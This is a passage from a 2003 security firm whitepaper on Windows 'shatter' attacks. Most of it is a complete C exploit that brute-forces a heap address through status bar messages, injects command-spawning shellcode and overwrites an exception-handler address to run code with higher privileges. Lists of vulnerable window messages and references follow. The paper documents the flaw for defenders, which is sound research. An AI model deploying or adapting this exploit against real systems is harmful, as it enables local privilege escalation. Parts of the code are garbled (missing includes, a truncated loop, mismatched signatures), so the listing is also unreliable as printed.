(HWND) hWndControl,        // handle to control 
(UINT) SB_GETTEXTLENGTH,      // message ID      
(WPARAM) wParam,      // = (WPARAM) (INT) iPart;     
(LPARAM) lParam      // = 0; not used, must be zero );   
Parameters 
iPart 
Zero-based index of the part from which to retrieve 
text.  
lParam 
Must be zero. 
This message returns the length of the text in the specified part. So when we have 
guessed the correct heap address and part one has been set to X, this message 
will return 1.  
This is not enough though, because many memory addresses will set the text of 
part one to a string of one character in length. So after finding an address that 
returns 1 from this message we go through the procedure again, setting the title 
bar to a string of 0x80. This gets converted to Unicode \xAC\x20 and therefore if 
we have the correct address, the next call to SB_GETTEXTLENGTH will return a 
value greater than 1. If we do not have the correct address, it will return 1 again. 
Statusbar 
Overwrite Example 
/************************************************************************************* 
* Statusbar Control Shatter exploit  
* 
* Demonstrates the use of a combination of windows messages to; 
* - brute force a useable heap address 
* - place structure information inside a process 
* - inject shellcode to known location 
* - overwrite 4 bytes of a critical memory address 
* 
* 4 Variables need to be set for proper execution. 
* - tWindow is the title of the programs main window 
* - sehHandler is the critical address to overwrite 
03/10/2003 
Page 14 of 19  
Copyright Security-Assessment.com Ltd 2003 
* - shellcodeaddr is the data space to inject the code 
* - heapaddr is the base heap address to start brute forcing 
* 
* Local shellcode is Win2kSp4 ENG Hardcoded because of unicode issues 
* Try it out against any program with a statusbar 
* 
*************************************************************************************/ 
#include  
#include  
#include  
// Local No Null Cmd Shellcode.  
BYTE exploit[] = 
"\x90\x33\xc9\x66\xb9\x36\x32\xc1\xe1\x09\x66\xb9\x63\x6d\x51\x54\xbb\x5c\x21
\x9d\x77\x03\xd9\xff\xd3\xcc\x90"; 
char g_classNameBuf[ 256 ]; 
char tWindow[]="WindowTitle";// The name of the main window 
long sehHandler = 0x7cXXXXXX; // Critical Address To Overwrite 
long shellcodeaddr = 0x7fXXXXXX; // Known Writeable Space Or Global Space 
unsigned long heapaddr = 0x00500000; // Base Heap Address 
long mainhWnd; 
void doWrite(HWND hWnd, long tByte,long address); 
void BruteForceHeap(HWND hWnd); 
void IterateWindows(long hWnd); 
int main(int argc, char *argv[]) 
{ 
   HMODULE hMod; 
   DWORD ProcAddr; 
   long x; 
   printf("%% Playing with status bar messages\n"); 
   printf("%% PI:EMAIL\n\n"); 
   if (argc = 2) 
      sscanf(argv[1],"%lx",&heapaddr); 
// Oddity 
   printf("%% Using base heap address...0x%xh\n",heapaddr); 
   printf("+ Finding %s Window...\n",tWindow); 
03/10/2003 
Page 15 of 19  
Copyright Security-Assessment.com Ltd 2003 
   mainhWnd = (long)FindWindow(NULL,tWindow); 
   if(mainhWnd == NULL) 
   { 
      printf("+ Couldn't Find %s Window\n",tWindow); 
      return 0; 
   } 
   printf("+ Found Main Window At......0x%xh\n",mainhWnd); 
   IterateWindows(mainhWnd); 
   printf("+ Done...\n"); 
   return 0; 
} 
void BruteForceHeap(HWND hWnd, long tByte,long address) 
{ 
   long retval; 
   BOOL foundHeap = FALSE; 
   char buffer[5000]; 
   memset(buffer,0,sizeof(buffer)); 
   while (!foundHeap) 
   { 
      printf("+ Trying Heap Address.......0x%xh ",heapaddr); 
      memset(buffer,0x58,sizeof(buffer)-1); 
      // Set Window Title 
      SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer); 
      // Set Part Contents  
      SendMessage((HWND) hWnd,(UINT) SB_SETTEXT,0,heapaddr); 
      retval=SendMessage((HWND) hWnd,(UINT) SB_GETTEXTLENGTH ,0,0); 
      printf("%d",retval); 
      if(retval == 1) 
      { 
         // First Retval should be 1 
         memset(buffer,0x80,sizeof(buffer)-1); 
         // Set Window Title 
         SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer);  
         // Set Part Contents  
         SendMessage((HWND) hWnd,(UINT) SB_SETTEXT,0,heapaddr); 
         retval=SendMessage((HWND) hWnd,(UINT) SB_GETTEXTLENGTH ,0,0); 
         if(retval > 1) 
         { 
            // Second should be larger than 1 
            printf(" : %d - Found Heap Address\n",retval); 
03/10/2003 
Page 16 of 19  
Copyright Security-Assessment.com Ltd 2003 
            return(0); 
         } 
      } 
      printf("\n"); 
      heapaddr += 2500; 
   } 
} 
void doWrite(HWND hWnd, long tByte,long address) 
{ 
   char buffer[5000]; 
   memset(buffer,0,sizeof(buffer)); 
   memset(buffer,tByte,sizeof(buffer)-1); 
   // Set Window Title 
   SendMessage( mainhWnd,(UINT) WM_SETTEXT,0,&buffer); 
   // Set Statusbar width 
   SendMessage( hWnd,(UINT) SB_SETPARTS,1,heapaddr); 
   SendMessage( hWnd,(UINT) SB_GETPARTS,1,address); 
} 
void IterateWindows(long hWnd) 
{ 
   long childhWnd,looper; 
   childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD); 
   while (childhWnd != NULL) 
   { 
      IterateWindows(childhWnd); 
      childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT); 
   } 
   GetClassName( (HWND)hWnd, g_classNameBuf, sizeof(g_classNameBuf) ); 
   if ( strcmp(g_classNameBuf, "msctls_statusbar32") ==0) 
   { 
      // Find Heap Address 
      BruteForceHeap((HWND) hWnd); 
      // Inject shellcode to known address 
      printf("+ Sending shellcode to......0x%xh\n",shellcodeaddr); 
      for (looper=0;looper> 8) & 0xff),sehHandler+1); 
03/10/2003 
Page 17 of 19  
Copyright Security-Assessment.com Ltd 2003 
      doWrite((HWND)hWnd, ((shellcodeaddr >> 16) & 0xff),sehHandler+2); 
      doWrite((HWND)hWnd, ((shellcodeaddr >> 24) & 0xff),sehHandler+3); 
      // Cause exception 
      printf("+ Forcing Unhandled Exception\n"); 
      SendMessage((HWND) hWnd,(UINT) SB_GETPARTS,1,1); 
      printf("+ Done...\n"); 
      exit(0); 
   } 
} 
Final Summary 
The exploitation of shatter attacks have come a long way from when the original 
vulnerability was announced. As we have shown in this document, even the most 
obscure of messages can be used to make a process execute code that it was not 
intended to run.  
While there have been discussions around the filtering of messages to protect 
interactive applications that run under a higher security context. It is becoming 
apparent that the only sure solution is to not have these applications running on 
an untrusted users desktop. 
Application designers and system administrators need to be aware of the dangers 
associated with running higher privileged applications on a users desktop, and 
take steps to prevent them from been exploited. 
The examples included in this paper can be used against any interactive 
application that runs at a higher level, simply by specifying parameters such as 
the window title. Successful exploitation would allow a user to then execute 
commands under this higher-level security context.  
Callback Messages 
The following messages use callbacks as a parameter and are known to be 
vulnerable to exploitation. 
• 
WM_TIMER ( A patch has been released for this case ) 
• 
LVM_SORTITEMS 
• 
LVM_SORTITEMSEX 
• 
EM_SETWORDBREAKPROC 
The following messages use callbacks as a parameter through a pointer to a 
structure. They are potentially vulnerable to exploitation. 
• 
EM_STREAMOUT 
• 
EM_STREAMIN 
• 
EM_SETHYPHENATEINFO 
• 
TVM_SORTCHILDRENCB 
03/10/2003 
Page 18 of 19  
Copyright Security-Assessment.com Ltd 2003 
Overwrite 
Messages 
The following messages use a pointer to a structure as a parameter and 
are known to allow for overwriting of arbitrary memory locations. 
• 
HDM_GETITEMRECT  
• 
HDM_GETORDERARRAY 
• 
HDM_GETITEM 
• 
LVM_CREATEDRAGIMAGE 
• 
LVM_GETCOLUMNORDERARRAY 
• 
LVM_GETITEM 
• 
LVM_GETITEMPOSITION 
• 
LVM_GETITEMRECT 
• 
LVM_GETITEMTEXT 
• 
LVM_GETNUMBEROFWORKAREAS 
• 
LVM_GETSUBITEMRECT 
• 
LVM_GETVIEWRECT 
• 
PBM_GETRANGE 
• 
SB_GETPARTS 
• 
TB_GETITEMRECT 
• 
TB_GETMAXSIZE 
• 
TCM_GETITEM 
• 
TCM_GETITEMRECT 
• 
TVM_GETITEM 
• 
TVM_GETITEMRECT 
References  
http://security.tombom.co.uk/shatter.html 
http://www.idefense.com/idpapers/Shatter_Redux.pdf 
http://msdn.microsoft.com/library/en-us/shellcc/platform/commctls/wincontrols.asp 
http://www.microsoft.com/TechNet/Security/news/htshat.asp 
http://www.microsoft.com/technet/security/bulletin/MS02-071.asp 
http://www.nextgenss.com/advisories/utilitymanager.txt 
http://www.securityfocus.com/bid/5408/exploit/ 
http://www.securityfocus.com/data/vulnerabilities/exploits/mcafee-shatterseh2.c 
www.security-assessment.com   
03/10/2003 
Page 19 of 19  
Copyright Security-Assessment.com Ltd 2003 
About Security-
Assessment.com  
Security-Assessment.com is an established team of Information Security 
consultants specialising in providing high quality Information Security services to 
clients throughout the UK, Europe and Australasia. We provide independent 
advice, in-depth knowledge and high level technical expertise to their clients who 
range from small businesses to some of the worlds largest companies 
Using proven security principles and practices combined with leading software and 
hardware solutions we work with our clients to generate simple and appropriate 
solutions to Information security challenges that are easy to understand and use 
for their clients. 
Security-Assessment.com provides security solutions that enable developers, 
government and enterprises to add strong security to their businesses, devices, 
networks and applications. We lead the market in on-line security compliance 
applications with their ISO 17799 "Code of Practice for Information Security 
Management" system which enables companies to ensure that they are effective 
and in line with accepted best practice for Information Security Management. 
Copyright 
Information 
These articles are free to view in electronic form, however, Security-
Assessment.com and the publications that originally published these articles 
maintain their copyrights. You are entitled to copy or republish them or store them 
in your computer on the provisions that the document is not changed, edited, or 
altered in any form, and if stored on a local system, you must maintain the original 
copyrights and credits to the author(s), except where otherwise explicitly agreed by 
Security-Assessment.com Ltd.